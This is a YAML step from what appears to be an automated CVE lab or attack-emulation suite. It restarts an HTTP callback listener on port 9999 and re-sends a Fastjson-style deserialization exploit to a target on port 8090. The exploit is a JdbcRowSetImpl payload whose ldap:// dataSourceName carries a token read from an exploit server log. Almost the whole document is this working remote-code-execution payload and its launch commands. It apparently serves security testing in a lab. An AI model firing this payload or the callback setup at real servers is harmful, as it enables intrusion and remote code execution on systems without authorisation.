- id: 45-1-2-24-rce-restart-callback-and-re-send-exploit
  stage: execution
  actor: attacker
  description: Restart callback and re-send exploit
  mitre:
    tactic: execution
    technique: ''
    technique_name: execution
  executor:
    type: direct
    command: "mkdir -p /tmp/cvelab-sysfield\n(fuser -k 9999/tcp 2>/dev/null; sleep\
      \ 1\n# Restart callback listener on port 9999\npython3 -c \"\nimport http.server,\
      \ socketserver\n\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n\
      \        print(f'[CALLBACK RECEIVED] Path: {self.path}')\n        self.send_response(200)\n\
      \        self.end_headers()\n        self.wfile.write(b'OK')\n    def log_message(self,\
      \ format, *args):\n        print(f'[HTTP] {args}')\n\nsocketserver.TCPServer.allow_reuse_address\
      \ = True\nwith socketserver.TCPServer(('{{ target_ip }}', 9999), H) as s:\n\
      \    print('[CALLBACK] Listening on :9999...')\n    s.handle_request()\n   \
      \ print('[CALLBACK] Done!')\n\" &\nsleep 2\n\n# Now send the payload again with\
      \ a new token\n# First get the current token\nTOKEN=$(grep 'ldap://{{ target_ip\
      \ }}:1389/' /tmp/exploit_server.log | grep 'JDK 1.8' | tail -1 | grep -oP '1389/\\\
      K\\w+')\necho \"Token: $TOKEN\"\n\ncurl -s -X POST http://{{ target_ip }}:8090/\
      \ -H \"Content-Type: application/json\" -d \"{\\\"b\\\":{\\\"@type\\\":\\\"\
      com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://{{ target_ip\
      \ }}:1389/${TOKEN}\\\",\\\"autoCommit\\\":true}}\") > /tmp/cvelab-sysfield/45-1-2-24-rce-restart-callback-and-re-send-exploit.out\
      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/45-1-2-24-rce-restart-callback-and-re-send-exploit.out\n\
      exit $status"
  expected_output:
    exit_code: 0
  postconditions:
